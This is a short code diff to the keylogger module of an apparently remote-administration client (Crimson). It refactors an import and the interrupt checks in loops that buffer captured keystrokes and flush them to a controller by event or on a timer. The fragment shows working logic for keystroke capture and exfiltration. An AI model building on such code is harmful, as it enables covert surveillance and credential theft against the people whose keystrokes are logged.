@@ -29,7 +29,7 @@ import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 import com.subterranean_security.crimson.client.net.ClientCommands;
-import com.subterranean_security.crimson.core.proto.Generator.ClientConfig.FLUSH_METHOD;
+import com.subterranean_security.crimson.core.proto.Keylogger.FLUSH_METHOD;
 import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
 import com.subterranean_security.crimson.core.util.Native;
 
@@ -58,7 +58,7 @@ public enum Keylogger {
 				try {
 					switch (method) {
 					case EVENT:
-						while (!monitor.isInterrupted()) {
+						while (!Thread.currentThread().isInterrupted()) {
 							// wait for an event
 							buffer.wait();
 							if (buffer.size() > value) {
@@ -68,7 +68,7 @@ public enum Keylogger {
 						}
 						break;
 					case TIME:
-						while (!monitor.isInterrupted()) {
+						while (!Thread.currentThread().isInterrupted()) {
 							Thread.sleep(value);
 							ClientCommands.flushKeybuffer();
 
